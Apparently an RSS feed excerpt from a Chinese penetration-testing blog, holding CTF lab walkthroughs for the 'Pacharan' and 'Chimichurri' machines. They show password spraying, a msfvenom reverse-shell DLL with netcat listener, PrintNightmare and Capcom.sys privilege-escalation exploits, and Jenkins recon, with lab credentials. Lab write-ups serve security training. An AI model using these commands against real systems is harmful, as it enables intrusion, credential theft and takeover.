Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

Error: An error of type WinRM::WinRMAuthorizationError happened, message is WinRM::WinRMAuthorizationError

Error: Exiting with code 1

<br>失败了<br>还有一个用户<br>
Orujo ：Pericodelospalotes6969 <br>┌──(root㉿kali)-[/home/kali/thl/Pacharan]
└─# evil-winrm -i 192.168.69.69 -u Orujo -p Pericodelospalotes6969

Evil-WinRM shell v3.5

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

Error: An error of type WinRM::WinRMAuthorizationError happened, message is WinRM::WinRMAuthorizationError

Error: Exiting with code 1

<br>好吧也不行<br><br>看一下Orujo用户的smb共享<br>┌──(root㉿kali)-[/home/kali/thl/Pacharan]
└─# smbmap -u Orujo -p Pericodelospalotes6969 -H 192.168.69.69

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
 -----------------------------------------------------------------------------
     SMBMap - Samba Share Enumerator | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB
[*] Established 1 SMB session(s)

[+] IP: 192.168.69.69:445       Name: PACHARAN.THL              Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Admin remota
        C$                                                      NO ACCESS       Recurso predeterminado
        IPC$                                                    READ ONLY       IPC remota
        NETLOGON                                                READ ONLY       Recurso compartido del servidor de inicio de sesión
        NETLOGON2                                               NO ACCESS
        PACHARAN                                                READ ONLY
        PDF Pro Virtual Printer                                 NO ACCESS       Soy Hacker y arreglo impresoras
        print$                                                  NO ACCESS       Controladores de impresora
        SYSVOL                                                  NO ACCESS       Recurso compartido del servidor de inicio de sesión
        Users                                                   NO ACCESS

<br>┌──(root㉿kali)-[/home/kali/thl/Pacharan]
└─# smbclient -U Orujo  //192.168.69.69/PACHARAN
Password for [WORKGROUP\Orujo]:
Try "help" to get a list of possible commands.
smb: \&gt; ls
  .                                   D        0  Thu Aug  1 01:21:13 2024
  ..                                  D        0  Thu Aug  1 01:21:13 2024
  ah.txt                              A      921  Thu Aug  1 01:20:16 2024

                7735807 blocks of size 4096. 4712894 blocks available
┌──(root㉿kali)-[/home/kali/thl/Pacharan]
└─# cat ah.txt
Mamasoystreamer1!
Mamasoystreamer2@
Mamasoystreamer3#
Mamasoystreamer4$
Mamasoystreamer5%
Mamasoystreamer6^
Mamasoystreamer7&amp;
Mamasoystreamer8*
Mamasoystreamer9(
Mamasoystreamer10)
MamasoyStreamer11!
MamasoyStreamer12@
MamasoyStreamer13#
MamasoyStreamer14$
MamasoyStreamer15%
MamasoyStreamer16^
MamasoyStreamer17&amp;
MamasoyStreamer18*
MamasoyStreamer19(
MamasoyStreamer20)
MamaSoyStreamer1!
MamaSoyStreamer2@
MamaSoyStreamer3#
MamaSoyStreamer4$
MamaSoyStreamer5%
MamaSoyStreamer6^
MamaSoyStreamer7&amp;
MamaSoyStreamer8*
MamaSoyStreamer9(
MamaSoyStreamer10)
MamasoyStream1er!
MamasoyStream2er@
MamasoyStream3er#
MamasoyStream4er$
MamasoyStream5er%
MamasoyStream6er^
MamasoyStream7er&amp;
MamasoyStream8er*
MamasoyStream9er(
MamasoyStream10er)
MamasoyStr1amer!
MamasoyStr2amer@
MamasoyStr3amer#
MamasoyStr4amer$
MamasoyStr5amer%
MamasoyStr6amer^
MamasoyStr7amer&amp;
MamasoyStr8amer*
MamasoyStr9amer(
MamasoyStr10amer)
Mamasoystreamer1

<br>看这像是一个密码表<br><br>┌──(root㉿kali)-[/home/kali/thl/Pacharan]
└─# crackmapexec smb PACHARAN.THL -u valid_users.txt -p ah.txt --continue-on-success |grep +
SMB         PACHARAN.THL    445    WIN-VRU3GG3DPLJ  [+] PACHARAN.THL\whisky:MamasoyStream2er@
SMB         PACHARAN.THL    445    WIN-VRU3GG3DPLJ  [+] PACHARAN.THL\Whisky:MamasoyStream2er@

<br>成功获取到了 Whisky 用户的密码<br>
尝试evil -winrm登录<br>
┌──(root㉿kali)-[/home/kali/thl/Pacharan]
└─# evil-winrm -i 192.168.69.69 -u 'Whisky' -p 'MamasoyStream2er@'

Evil-WinRM shell v3.5

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

Error: An error of type WinRM::WinRMAuthorizationError happened, message is WinRM::WinRMAuthorizationError

Error: Exiting with code 1

<br>又失败了<br>才看下 Whisky 用户的smb共享<br>┌──(root㉿kali)-[/home/kali/thl/Pacharan]
└─# smbmap -u Whisky -p MamasoyStream2er@ -H 192.168.69.69

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
 -----------------------------------------------------------------------------
     SMBMap - Samba Share Enumerator | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB
[*] Established 1 SMB session(s)
[/] Auth[!] Unable to remove test file at \\192.168.69.69\PDF Pro Virtual Printer\LBJIFVWHAS.txt, please remove manually

[+] IP: 192.168.69.69:445       Name: PACHARAN.THL              Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Admin remota
        C$                                                      NO ACCESS       Recurso predeterminado
        IPC$                                                    READ ONLY       IPC remota
        NETLOGON                                                READ ONLY       Recurso compartido del servidor de inicio de sesión
        NETLOGON2                                               NO ACCESS
        PACHARAN                                                NO ACCESS
        PDF Pro Virtual Printer                                 NO ACCESS       Soy Hacker y arreglo impresoras
        print$                                                  NO ACCESS       Controladores de impresora
        SYSVOL                                                  NO ACCESS       Recurso compartido del servidor de inicio de sesión
        Users                                                   NO ACCESS

<br>没有啥东西啊<br>利用 Whisky 用户的权限进行 rid-brute 收集域内用户<br>
┌──(root㉿kali)-[/home/kali/thl/Pacharan]
└─# crackmapexec smb PACHARAN.THL -u Whisky -p MamasoyStream2er@ --rid-brute &gt;rid-brute.txt

┌──(root㉿kali)-[/home/kali/thl/Pacharan]
└─# wc -l rid-brute.txt
40 rid-brute.txt

┌──(root㉿kali)-[/home/kali/thl/Pacharan]
└─# cat rid-brute.txt |grep SidTypeUser |cut -d ' ' -f21|cut -d '\' -f2 &gt;valid_users.txt

┌──(root㉿kali)-[/home/kali/thl/Pacharan]
└─# cat valid_users.txt
Administrador
Invitado
krbtgt
DefaultAccount
WIN-VRU3GG3DPLJ$
Orujo
Ginebra
Whisky
Hendrick
Chivas
Whisky2
JB
Chivas
beefeater
CarlosV
RedLabel
Gordons
<br>查看打印机<br>┌──(root㉿kali)-[/home/kali/thl/Pacharan]
└─# rpcclient -U "Whisky%MamasoyStream2er@" 192.168.69.69 -c 'enumprinters'
        flags:[0x800000]
        name:[\\192.168.69.69\Soy Hacker y arreglo impresoras]
        description:[\\192.168.69.69\Soy Hacker y arreglo impresoras,Universal Document Converter,TurkisArrusPuchuchuSiu1]
        comment:[Soy Hacker y arreglo impresoras]

<br>获取到一个密码 TurkisArrusPuchuchuSiu1<br>
密码喷涂试试<br>┌──(root㉿kali)-[/home/kali/thl/Pacharan]
└─# crackmapexec smb PACHARAN.THL -u valid_users.txt -p TurkisArrusPuchuchuSiu1 --continue-on-success |grep +
SMB         PACHARAN.THL    445    WIN-VRU3GG3DPLJ  [+] PACHARAN.THL\Chivas Regal:TurkisArrusPuchuchuSiu1

<br>Evil-winrm登录<br>┌──(root㉿kali)-[/home/kali/thl/Pacharan]
└─# evil-winrm -i 192.168.69.69 -u 'Chivas Regal' -p 'TurkisArrusPuchuchuSiu1'

Evil-WinRM shell v3.5

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

<br><br>在利用smb检测时我们看到存在一台打印机，那我们可以尝试利用相关漏洞<br>
<a data-tooltip-position="top" aria-label="../../20-网安/28-CVE复现/CVE-2021-34527" data-href="../../20-网安/28-CVE复现/CVE-2021-34527" href="https://www.c1trus.top/20-网安/28-cve复现/cve-2021-34527.html" class="internal-link" target="_self" rel="noopener nofollow">CVE-2021-34527</a> 也叫 PrintNightmare漏洞<br>利用脚本 <a rel="noopener nofollow" class="external-link" href="https://github.com/JohnHammond/CVE-2021-34527" target="_blank">https://github.com/JohnHammond/CVE-2021-34527</a><br>
这里只是wp 我直接讲如何做<br>
先检查一下打印机相关的协议是否运行<br>┌──(kali㉿kali)-[~/thl/Pacharan]
└─$ impacket-rpcdump @192.168.69.69 | grep -E 'MS-RPRN|MS-PAR'
Protocol: [MS-RPRN]: Print System Remote Protocol
Protocol: [MS-PAR]: Print System Asynchronous Remote Protocol

<br>很好 这两个协议都在运行<br>然后用msf生成一个反向dll 然后上传上去<br>msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.69.3 lport=4455 -f dll -o reverse.dll
<br>复制到一个windows下默认可写的目录下。具体的可以看这里<a rel="noopener nofollow" class="external-link" href="https://github.com/api0cradle/UltimateAppLockerByPassList/blob/master/Generic-AppLockerbypasses.md" target="_blank">https://github.com/api0cradle/UltimateAppLockerByPassList/blob/master/Generic-AppLockerbypasses.md</a><br>*Evil-WinRM* PS C:\Users\Chivas Regal\Documents&gt; cp reverse.dll  C:\Windows\Tasks\reverse.dll
<br>加载漏洞利用模块 然后执行dll 反弹shell<br>*Evil-WinRM* PS C:\Users\Chivas Regal\Documents&gt; upload /home/kali/thl/Pacharan/CVE-2021-34527.ps1

Info: Uploading /home/kali/thl/Pacharan/CVE-2021-34527.ps1 to C:\Users\Chivas Regal\Documents\CVE-2021-34527.ps

Data: 238084 bytes of 238084 bytes copied

Info: Upload successful!
*Evil-WinRM* PS C:\Users\Chivas Regal\Documents&gt; ls


    Directorio: C:\Users\Chivas Regal\Documents


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        12/4/2024   3:53 PM         295936 6666.exe
-a----        12/4/2024   8:42 PM         178563 CVE-2021-34527.ps1
-a----        12/4/2024   8:26 PM           9216 reverse.dll


*Evil-WinRM* PS C:\Users\Chivas Regal\Documents&gt; Import-Module .\CVE-2021-34527.ps1

nc -lvnp 4455

Invoke-Nightmare -DLL 'C:\Windows\Tasks\reverse.dll'
<br>然后就可以获取到系统用户的shell了<br>┌──(root㉿kali)-[/home/kali/thl/Pacharan]
└─# nc -lvnp 4455
listening on [any] 4455 ...
connect to [192.168.69.3] from (UNKNOWN) [192.168.69.69] 49194
Microsoft Windows [Versi▒n 10.0.14393]
(c) 2016 Microsoft Corporation. Todos los derechos reservados.

C:\Windows\system32&gt;whoami
whoami
nt authority\system

C:\Windows\system32&gt;
<br>c:\Users\Chivas Regal\Desktop&gt;type user.txt
type user.txt
bb8b4df8eda73e75ca51ca88a909c1cb  -


c:\Users\Administrador\Desktop&gt;type root.txt
type root.txt
cfa7cb1cc20e26c0428f9222d44c76a0  -

<br><br>查看权限时可以看到我们有 <a data-tooltip-position="top" aria-label="../渗透姿势库/SeLoadDriverPrivilege" data-href="../渗透姿势库/SeLoadDriverPrivilege" href="https://www.c1trus.top/24-渗透/渗透姿势库/seloaddriverprivilege.html" class="internal-link" target="_self" rel="noopener nofollow">SeLoadDriverPrivilege</a>权限<br>
该权限允许用户或进程在系统上加载和卸载设备驱动程序。<br>
通常，只有管理员或受信任的系统进程才会被授予此权限<br>*Evil-WinRM* PS C:\Users\Chivas Regal\Documents&gt; whoami /priv

INFORMACIàN DE PRIVILEGIOS
--------------------------

Nombre de privilegio          Descripci¢n                                     Estado
============================= =============================================== ==========
SeMachineAccountPrivilege     Agregar estaciones de trabajo al dominio        Habilitada
SeLoadDriverPrivilege         Cargar y descargar controladores de dispositivo Habilitada
SeChangeNotifyPrivilege       Omitir comprobaci¢n de recorrido                Habilitada
SeIncreaseWorkingSetPrivilege Aumentar el espacio de trabajo de un proceso    Habilitada

<br>然后可以从<a data-tooltip-position="top" aria-label="https://github.com/k4sth4/SeLoadDriverPrivilege" rel="noopener nofollow" class="external-link" href="https://github.com/k4sth4/SeLoadDriverPrivilege" target="_blank">这里</a> 获取到漏洞利用的相关工具<br>上传相关工具：
*Evil-WinRM* PS C:\Users\Chivas Regal\Documents&gt; upload /home/kali/thl/Pacharan/ExploitCapcom.exe

Info: Uploading /home/kali/thl/Pacharan/ExploitCapcom.exe to C:\Users\Chivas Regal\Documents\ExploitCapcom.exe

Data: 387752 bytes of 387752 bytes copied

Info: Upload successful!
*Evil-WinRM* PS C:\Users\Chivas Regal\Documents&gt; upload /home/kali/thl/Pacharan/eoploaddriver_x64.exe

Info: Uploading /home/kali/thl/Pacharan/eoploaddriver_x64.exe to C:\Users\Chivas Regal\Documents\eoploaddriver_x64.exe

Data: 92840 bytes of 92840 bytes copied

Info: Upload successful!
*Evil-WinRM* PS C:\Users\Chivas Regal\Documents&gt; upload /home/kali/thl/Pacharan/Capcom.sys

Info: Uploading /home/kali/thl/Pacharan/Capcom.sys to C:\Users\Chivas Regal\Documents\Capcom.sys

Data: 14100 bytes of 14100 bytes copied

Info: Upload successful!


加载恶意驱动程序：
*Evil-WinRM* PS C:\Users\Chivas Regal\Documents&gt; .\ExploitCapcom.exe LOAD c:\windows\tasks\Capcom.sys
[*] Service Name: drlynhqu
[+] Enabling SeLoadDriverPrivilege
[+] SeLoadDriverPrivilege Enabled
[+] Loading Driver: \Registry\User\S-1-5-21-3046175042-3013395696-775018414-1108\?????????????????
NTSTATUS: 00000000, WinError: 0


漏洞利用 特权用户执行命令
*Evil-WinRM* PS C:\Users\Chivas Regal\Documents&gt; .\ExploitCapcom.exe EXPLOIT whoami
[*] Capcom.sys exploit
[*] Capcom.sys handle was obtained as 0000000000000064
[*] Shellcode was placed at 00000239224D0008
[+] Shellcode was executed
[+] Token stealing was successful
[+] Command Executed
nt authority\system

]]></description><link>https://www.c1trus.top/24-渗透/thl/2.pacharan.html</link><guid isPermaLink="false">24-渗透/THL/2.Pacharan.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Thu, 26 Dec 2024 06:21:46 GMT</pubDate></item><item><title><![CDATA[10.Cyberguard]]></title><description><![CDATA[ 
 <br><br>
<br><a data-tooltip-position="top" aria-label="1. 基本信息^toc" data-href="#1. 基本信息^toc" href="https://www.c1trus.top/about:blank#1._基本信息^toc" class="internal-link" target="_self" rel="noopener nofollow">1. 基本信息</a><br>
靶机链接<br>
难度 ⭐️⭐️⭐️⭐️⭐️
]]></description><link>https://www.c1trus.top/24-渗透/thl/10.cyberguard.html</link><guid isPermaLink="false">24-渗透/THL/10.Cyberguard.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Thu, 26 Dec 2024 06:21:46 GMT</pubDate></item><item><title><![CDATA[1.Chimichurri]]></title><description><![CDATA[ 
 <br><br>
<br><a data-tooltip-position="top" aria-label="1. 基本信息^toc" data-href="#1. 基本信息^toc" href="https://www.c1trus.top/about:blank#1._基本信息^toc" class="internal-link" target="_self" rel="noopener nofollow">1. 基本信息</a>
<br><a data-tooltip-position="top" aria-label="2. 信息收集" data-href="#2. 信息收集" href="https://www.c1trus.top/about:blank#2._信息收集" class="internal-link" target="_self" rel="noopener nofollow">2. 信息收集</a>
<br><a data-tooltip-position="top" aria-label="3. SMB空会话检测" data-href="#3. SMB空会话检测" href="https://www.c1trus.top/about:blank#3._SMB空会话检测" class="internal-link" target="_self" rel="noopener nofollow">3. SMB空会话检测</a>
<br><a data-tooltip-position="top" aria-label="4. rid-brute获取域内用户" data-href="#4. rid-brute获取域内用户" href="https://www.c1trus.top/about:blank#4._rid-brute获取域内用户" class="internal-link" target="_self" rel="noopener nofollow">4. rid-brute获取域内用户</a>
<br><a data-tooltip-position="top" aria-label="5. ldap获取域内基础信息" data-href="#5. ldap获取域内基础信息" href="https://www.c1trus.top/about:blank#5._ldap获取域内基础信息" class="internal-link" target="_self" rel="noopener nofollow">5. ldap获取域内基础信息</a>
<br><a data-tooltip-position="top" aria-label="6. kerbrute枚举出域内用户" data-href="#6. kerbrute枚举出域内用户" href="https://www.c1trus.top/about:blank#6._kerbrute枚举出域内用户" class="internal-link" target="_self" rel="noopener nofollow">6. kerbrute枚举出域内用户</a>
<br><a data-tooltip-position="top" aria-label="7. 密码喷涂" data-href="#7. 密码喷涂" href="https://www.c1trus.top/about:blank#7._密码喷涂" class="internal-link" target="_self" rel="noopener nofollow">7. 密码喷涂</a>
<br><a data-tooltip-position="top" aria-label="8. Jenkins利用" data-href="#8. Jenkins利用" href="https://www.c1trus.top/about:blank#8._Jenkins利用" class="internal-link" target="_self" rel="noopener nofollow">8. Jenkins利用</a>
<br><a data-tooltip-position="top" aria-label="9. 提权" data-href="#9. 提权" href="https://www.c1trus.top/about:blank#9._提权" class="internal-link" target="_self" rel="noopener nofollow">9. 提权</a>
<br><a data-tooltip-position="top" aria-label="10. 降权" data-href="#10. 降权" href="https://www.c1trus.top/about:blank#10._降权" class="internal-link" target="_self" rel="noopener nofollow">10. 降权</a><br>
靶机链接 thehackerslabs.com/chimichurri/<br>
难度 ⭐️⭐️⭐️️
<br><br>┌──(root㉿kali)-[~]
└─# fscan -h 192.168.200.4

   ___                              _
  / _ \     ___  ___ _ __ __ _  ___| | __
 / /_\/____/ __|/ __| '__/ _` |/ __| |/ /
/ /_\\_____\__ \ (__| | | (_| | (__|   &lt;
\____/     |___/\___|_|  \__,_|\___|_|\_\
                     fscan version: 1.8.4
start infoscan
192.168.200.4:88 open
192.168.200.4:139 open
192.168.200.4:135 open
192.168.200.4:445 open
[*] alive ports len is: 4
start vulscan
[*] NetInfo
[*]192.168.200.4
   [-&gt;]CHIMICHURRI
   [-&gt;]192.168.200.4
[*] NetBios 192.168.200.4   [+] DC:CHIMICHURRI0\CHIMICHURRI
已完成 4/4
[*] 扫描结束,耗时: 1.070314445s

┌──(root㉿kali)-[/home/kali/thl/Chimichurri]
└─# nmap -sC -sV 192.168.200.4
Nmap scan report for CHIMICHURRI0.local (192.168.200.4)
Host is up (0.00043s latency).
Not shown: 988 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-12-03 10:37:33Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: chimichurri.thl, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: chimichurri.thl, Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
6969/tcp open  http          Jetty 10.0.11
|_http-title: Panel de control [Jenkins]
| http-robots.txt: 1 disallowed entry
|_/
|_http-server-header: Jetty(10.0.11)
MAC Address: 08:00:27:B8:51:4D (Oracle VirtualBox virtual NIC)
Service Info: Host: CHIMICHURRI; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time:
|   date: 2024-12-03T10:37:33
|_  start_date: 2024-12-03T10:04:56
|_nbstat: NetBIOS name: CHIMICHURRI, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 08:00:27:b8:51:4d (Oracle VirtualBox virtual NIC)
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
|_clock-skew: 5h59m57s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 25.34 seconds

<br>域名 CHIMICHURRI0<br>
配置一下 etc/hosts<br>192.168.200.4 chimichurri.thl
<br><br>┌──(root㉿kali)-[/home/kali/thl/Chimichurri]
└─# smbmap -u anonymous -H 192.168.200.4

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
 -----------------------------------------------------------------------------
     SMBMap - Samba Share Enumerator | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB
[*] Established 1 SMB session(s)

[+] IP: 192.168.200.4:445       Name: chimichurri.thl        Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Admin remota
        C$                                                      NO ACCESS       Recurso predeterminado
        drogas                                                  READ ONLY
        IPC$                                                    READ ONLY       IPC remota
        NETLOGON                                                NO ACCESS       Recurso compartido del servidor de inicio de sesión
        SYSVOL                                                  NO ACCESS       Recurso compartido del servidor de inicio de sesión

<br>查看smb共享目录<br>┌──(root㉿kali)-[/home/kali/thl/Chimichurri]
└─# smbclient -U '' //chimichurri.thl/drogas
Password for [WORKGROUP\]:
Try "help" to get a list of possible commands.
smb: \&gt; ls
  .                                   D        0  Thu Jun 27 18:20:49 2024
  ..                                  D        0  Thu Jun 27 18:20:49 2024
  credenciales.txt                    A       95  Mon Jul  1 01:19:03 2024

                7735807 blocks of size 4096. 4368462 blocks available

smb: \&gt; get credenciales.txt
getting file \credenciales.txt of size 95 as credenciales.txt (46.4 KiloBytes/sec) (average 46.4 KiloBytes/sec)
smb: \&gt; exit

┌──(root㉿kali)-[/home/kali/thl/Chimichurri]
└─# smbclient -U '' //chimichurri.thl/IPC$
Password for [WORKGROUP\]:
Try "help" to get a list of possible commands.
smb: \&gt; ls -a
NT_STATUS_NO_SUCH_FILE listing \-a
smb: \&gt; exit

<br>查看文件内容<br>┌──(root㉿kali)-[/home/kali/thl/Chimichurri]
└─# cat credenciales.txt
Todo es mejor en con el usuario hacker, en su escritorio estan sus claves de acceso como perico     
<br>
这句西班牙语的意思是：<br>
“所有事情都会更好，因为有黑客用户，他的桌子上有他的访问密钥，就像鹦鹉一样。”<br>
其中“como perico”是个比喻，可能意味着“很显眼”或“随意放置”，暗示这些密钥没有被妥善保护。
<br><br>因为存在 smb空会话 所以我们可以进行 rid-brute 获取域内用户<br>
rid-brute 只需要有一个域内合法用户即可进行。
<br>┌──(root㉿kali)-[/home/kali/thl/Chimichurri]
└─# crackmapexec smb chimichurri.thl -u 'guest ' -p ' ' --rid-brute

┌──(root㉿kali)-[/home/kali/thl/Chimichurri]
└─# crackmapexec smb chimichurri.thl -u 'guest ' -p ' ' --rid-brute
SMB         chimichurri.thl 445    CHIMICHURRI      [*] Windows 10 / Server 2016 Build 14393 x64 (name:CHIMICHURRI) (domain:chimichurri.thl) (signing:True) (SMBv1:False)
SMB         chimichurri.thl 445    CHIMICHURRI      [+] chimichurri.thl\guest :
SMB         chimichurri.thl 445    CHIMICHURRI      [-] Error creating DCERPC connection: SMB SessionError: code: 0xc0000022 - STATUS_ACCESS_DENIED - {Access Denied} A process has requested access to an object but has not been granted those access rights.

<br>失败了。 这里对匿名用户的权限做了设置<br><br>ldapsearch -x -H ldap://192.168.200.4 -s 'base' namingcontexts

┌──(root㉿kali)-[/home/kali/thl/Chimichurri]
└─# ldapsearch -x -H ldap://192.168.200.4 -s 'base' namingcontexts
# extended LDIF
#
# LDAPv3
# base &lt;&gt; (default) with scope baseObject
# filter: (objectclass=*)
# requesting: namingcontexts
#

#
dn:
namingContexts: DC=chimichurri,DC=thl
namingContexts: CN=Configuration,DC=chimichurri,DC=thl
namingContexts: CN=Schema,CN=Configuration,DC=chimichurri,DC=thl
namingContexts: DC=DomainDnsZones,DC=chimichurri,DC=thl
namingContexts: DC=ForestDnsZones,DC=chimichurri,DC=thl

# search result
search: 2
result: 0 Success

# numResponses: 2
# numEntries: 1
<br>没啥有用的东西<br><br>我们目前需要一个可用的域用户。由于对匿名用户做了限制不让进行 rid-brute 直接获取域内用户。 那只能尝试爆破枚举了<br>┌──(root㉿kali)-[/home/kali/thl/Chimichurri]
└─# kerbrute userenum -d chimichurri.thl -t 100 --dc 192.168.200.4  /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt

    __             __               __
   / /_____  _____/ /_  _______  __/ /____
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,&lt; /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/

Version: v1.0.3 (9dad6e1) - 12/03/24 - Ronnie Flathers @ropnop

2024/12/03 12:49:28 &gt;  Using KDC(s):
2024/12/03 12:49:28 &gt;   192.168.200.4:88

2024/12/03 12:49:28 &gt;  [+] VALID USERNAME:       hacker@chimichurri.thl
2024/12/03 12:49:28 &gt;  [+] VALID USERNAME:       Hacker@chimichurri.thl
2024/12/03 12:49:33 &gt;  [+] VALID USERNAME:       invitado@chimichurri.thl
2024/12/03 12:49:47 &gt;  [+] VALID USERNAME:       administrador@chimichurri.thl
2024/12/03 12:49:48 &gt;  [+] VALID USERNAME:       HACKER@chimichurri.thl

2024/12/03 12:54:16 &gt;  Done! Tested 8295455 usernames (5 valid) in 288.265 seconds

┌──(root㉿kali)-[/home/kali/thl/Chimichurri]
└─# awk '{print $7}' valid_user.txt | sed 's/@.*//' &gt;kerber_brute_users.txt

┌──(root㉿kali)-[/home/kali/thl/Chimichurri]
└─# cat kerber_brute_users.txt
hacker
Hacker
invitado
administrador
HACKER

<br>尝试利用这些用户的名字作为密码进行爆破<br><br>┌──(root㉿kali)-[/home/kali/thl/Chimichurri]
└─# crackmapexec smb chimichurri.thl -u kerber_brute_users.txt -p kerber_brute_users.txt --no-bruteforce --continue-on-success
SMB         chimichurri.thl 445    CHIMICHURRI      [*] Windows 10 / Server 2016 Build 14393 x64 (name:CHIMICHURRI) (domain:chimichurri.thl) (signing:True) (SMBv1:False)
SMB         chimichurri.thl 445    CHIMICHURRI      [-] chimichurri.thl\hacker:hacker STATUS_LOGON_FAILURE
SMB         chimichurri.thl 445    CHIMICHURRI      [-] chimichurri.thl\Hacker:Hacker STATUS_LOGON_FAILURE
SMB         chimichurri.thl 445    CHIMICHURRI      [-] chimichurri.thl\invitado:invitado STATUS_LOGON_FAILURE
SMB         chimichurri.thl 445    CHIMICHURRI      [-] chimichurri.thl\administrador:administrador STATUS_LOGON_FAILURE
SMB         chimichurri.thl 445    CHIMICHURRI      [-] chimichurri.thl\HACKER:HACKER STATUS_LOGON_FAILURE
<br>看来不存在将用户名作为密码的用户<br><br>观察nmap的结果可以发现靶机是开放了Jenkins的<br>6969/tcp open  http          Jetty 10.0.11
|_http-title: Panel de control [Jenkins]
| http-robots.txt: 1 disallowed entry
|_/
|_http-server-header: Jetty(10.0.11)
MAC Address: 08:00:27:B8:51:4D (Oracle VirtualBox virtual NIC)
Service Info: Host: CHIMICHURRI; OS: Windows; CPE: cpe:/o:microsoft:windows
<br><img alt="Pasted image 20241203133056" src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241203133056.png" referrerpolicy="no-referrer"><br>
jenkins是有很多漏洞的<br>
先去找一个最新的试试<br>
<a rel="noopener nofollow" class="external-link" href="https://www.exploit-db.com/" target="_blank">https://www.exploit-db.com/</a><br>
<img alt="Pasted image 20241203134231" src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241203134231.png" referrerpolicy="no-referrer"><br>试试这个LFI （<a data-tooltip-position="top" aria-label="../../20-网安/28-CVE复现/CVE-2024-23897" data-href="../../20-网安/28-CVE复现/CVE-2024-23897" href="https://www.c1trus.top/20-网安/28-cve复现/cve-2024-23897.html" class="internal-link" target="_self" rel="noopener nofollow">CVE-2024-23897</a>）<br>之前的 credenciales.txt 提示我们在 hacker 用户的桌面有一个凭证<br>┌──(root㉿kali)-[/home/kali/thl/Chimichurri]
└─# cat credenciales.txt
Todo es mejor en con el usuario hacker, en su escritorio estan sus claves de acceso como perico     
<br>
这句西班牙语的意思是：<br>
“所有事情都会更好，因为有黑客用户，他的桌子上有他的访问密钥，就像鹦鹉一样。”<br>
